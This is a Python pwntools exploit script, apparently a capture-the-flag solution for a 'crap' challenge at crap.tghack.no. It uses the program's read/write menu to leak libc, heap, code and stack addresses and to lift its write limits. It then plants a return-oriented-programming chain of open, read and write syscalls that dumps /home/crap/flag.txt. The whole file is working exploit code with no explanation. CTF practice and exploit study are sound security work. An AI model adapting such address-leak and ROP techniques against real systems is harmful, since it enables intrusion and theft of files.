#!/usr/bin/env python

from pwn import *

BINARY = './ld-2.31.so'
LIBC = './libc-2.31.so:/lib/x86_64-linux-gnu/libseccomp.so.2'
HOST = 'crap.tghack.no'
PORT = 6001

elf = ELF(BINARY)
#libc = ELF(LIBC)

context.terminal = ['tmux', 'split-w']


def get_base_address(proc):
        return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
        script = ""
        for bp in breakpoints:
                script += "b *0x%x\n"%(PIE+bp)
        gdb.attach(process(BINARY, argv="./crap"), gdbscript=script)

def start():
    if not args.REMOTE:
        print("LOCAL PROCESS")
        return process([BINARY, "./crap"],   env={"LD_PRELOAD":LIBC})
    else:
        print("REMOTE PROCESS")
        return remote(HOST, PORT)

def write(addr, val):
    p.sendlineafter("> ", '2')
    p.sendlineafter("addr/value: ", addr + " " + val)
    leak = p.recvuntil("\n")
    print(leak)

def readf(msg, addr):
    p.sendlineafter("> ", '1')
    p.sendlineafter("addr: ", addr)
    leak = p.recvuntil("\n")[7:-1]
    print(msg + " result: {}".format(str(leak)))
    return int(leak, 16)

p = start()
if args.GDB:
    gdb.attach(p, 'b do_writ')


p.sendlineafter("> ", '3')
p.sendlineafter("feedback: ", "B"*32 + "/home/crap/flag.txt\x00")
p.sendlineafter("(y/n)\n", "n")
p.sendlineafter("> ", "4")

libcleak = u64(p.recvuntil("\n")[10:16].ljust(8, b'\x00'))
libc_base = libcleak - 0x3b5be0

heap_base = 0x32f0

print(hex(libcleak))
print("Libc base: {}".format(hex(libc_base)))
p.sendlineafter("> ", "1")
p.sendlineafter("addr: ", str(hex(libcleak)))

heap_leak = p.recvuntil("\n")[7:21].ljust(8, b'\x00')
print("Heap leak: {}".format(heap_leak))

stdout_ptr = libc_base + 0x3b4f48


code_leak = readf("Code", str(hex(stdout_ptr)))
code_base = code_leak - 0x202010
print("Code base: {}".format(hex(code_base)))

write_count = code_base + 0x202034
print("write_count: {}".format(hex(write_count)))

read_count = code_base + 0x202030
print("read_count: {}".format(hex(read_count)))

write(str(hex(write_count)), '0x80000000')
write(str(hex(read_count)), '0x80000000')

environ_ptr = libc_base + 0x3b8618
stack_leak = readf("Stack: ", str(hex(environ_ptr)))

return_p = stack_leak - 0x118
rptr = readf("return ptr", str(hex(return_p)))
print("Return pointer: {}".format(hex(rptr)))

pop_rax = libc_base + 0x38e88
pop_rdx_rbx = libc_base + 0xf148c
pop_rsi = libc_base + 0x22192
pop_rdi = libc_base + 0x21882
syscall = libc_base + 0x39049
rets = libc_base + 0x280

pop_rbx_jmp_rax = libc_base + 0x7bfc4

write(str(hex(write_count)), '0x80000000')

#write(str(hex(stack_leak + 8)), "BBBB")
# Open syscall
print(str(hex(int(heap_leak, 16) - 0x1240)))
readf("Path: ", str(hex(int(heap_leak, 16) - 0x1240)))


write(str(hex(return_p + 8)), str(hex(pop_rax)))
write(str(hex(return_p + 8*2)), str(hex(pop_rdi)))
write(str(hex(return_p + 8*3)), str(hex(pop_rdi)))
write(str(hex(return_p + 8*4)), str(hex(int(heap_leak, 16) - 0x1240)))
write(str(hex(return_p + 8*5)), str(hex(pop_rsi)))
write(str(hex(return_p + 8*6)), "00000000")

write(str(hex(return_p + 8*7)), str(hex(pop_rax)))
write(str(hex(return_p + 8*8)), "00000002")
pop_rbx = libc_base + 0x000000000002bc45 #: pop rbx ; ret
write(str(hex(return_p + 8*9)), str(hex(pop_rbx)))
write(str(hex(return_p + 8*10)), str(hex(int(heap_leak, 16) - 0x1200)))
write(str(hex(return_p + 8*11)), str(hex(syscall)))

push_rax = libc_base + 0x0000000000034e6f# : push rax ; ret
mov_rbx_rax = libc_base + 0x0000000000122a14 #: mov qword ptr [rbx], rax ; pop rbx ; ret


#write(str(hex(return_p + 8*12)), str(hex(push_rax)))

write(str(hex(return_p + 8*12)), str(hex(mov_rbx_rax)))
write(str(hex(return_p + 8*13)), "D"*8)
write(str(hex(return_p + 8*14)), str(hex(pop_rdi)))
write(str(hex(return_p + 8*15)), "00000001")
write(str(hex(return_p + 8*16)), str(hex(pop_rsi)))
write(str(hex(return_p + 8*17)), str(hex(int(heap_leak, 16) - 0x1200)))
write(str(hex(return_p + 8*18)), str(hex(pop_rdx_rbx)))
write(str(hex(return_p + 8*19)), "00000050")
write(str(hex(return_p + 8*20)), "00000050")
write(str(hex(return_p + 8*21)), str(hex(pop_rax)))
write(str(hex(return_p + 8*22)), "00000001")
write(str(hex(return_p + 8*23)), str(hex(syscall)))


write(str(hex(write_count)), '0x80000000')

write(str(hex(return_p + 8*24)), str(hex(pop_rdi)))
write(str(hex(return_p + 8*25)), "00000000")
write(str(hex(return_p + 8*26)), str(hex(pop_rsi)))
write(str(hex(return_p + 8*27)), str(hex(int(heap_leak, 16) - 0x1240)))
write(str(hex(return_p + 8*28)), str(hex(pop_rdx_rbx)))
write(str(hex(return_p + 8*29)), "00000050")
write(str(hex(return_p + 8*30)), "00000020")
write(str(hex(return_p + 8*31)), str(hex(pop_rax)))
write(str(hex(return_p + 8*32)), "00000000")
write(str(hex(return_p + 8*33)), str(hex(syscall)))

write(str(hex(write_count)), '0x80000000')


# write syscall
write(str(hex(return_p + 8*21)), str(hex(pop_rdi)))
write(str(hex(return_p + 8*22)), "00000001")
write(str(hex(return_p + 8*23)), str(hex(pop_rsi)))
write(str(hex(return_p + 8*24)), str(hex(int(heap_leak, 16) - 0x1240)))
write(str(hex(return_p + 8*25)), str(hex(pop_rdx_rbx)))
write(str(hex(return_p + 8*26)), "0000050")
write(str(hex(return_p + 8*27)), "00000020")
write(str(hex(return_p + 8*28)), str(hex(pop_rax)))
write(str(hex(return_p + 8*29)), "00000001")
write(str(hex(return_p + 8*30)), str(hex(syscall)))
"""
write(str(hex(return_p + 8*10)), str(hex(rets)))

write(str(hex(write_count)), '0x80000000')

# Read syscall


write(str(hex(return_p + 8*11)), str(hex(pop_rdi)))
write(str(hex(return_p + 8*12)), "00000000")
write(str(hex(return_p + 8*13)), str(hex(pop_rsi)))
write(str(hex(return_p + 8*14)), str(hex(int(heap_leak, 16) - 0x1240)))
write(str(hex(return_p + 8*15)), str(hex(pop_rdx_rbx)))
write(str(hex(return_p + 8*16)), "00000050")
write(str(hex(return_p + 8*17)), "00000020")
write(str(hex(return_p + 8*18)), str(hex(pop_rax)))
write(str(hex(return_p + 8*19)), "00000000")
write(str(hex(return_p + 8*20)), str(hex(syscall)))



write(str(hex(write_count)), '0x80000000')

print(" {} {}".format(hex(return_p), hex(rets)))
#p.interactive()
"""
write(str(hex(return_p)), str(hex(rets)))

p.interactive()

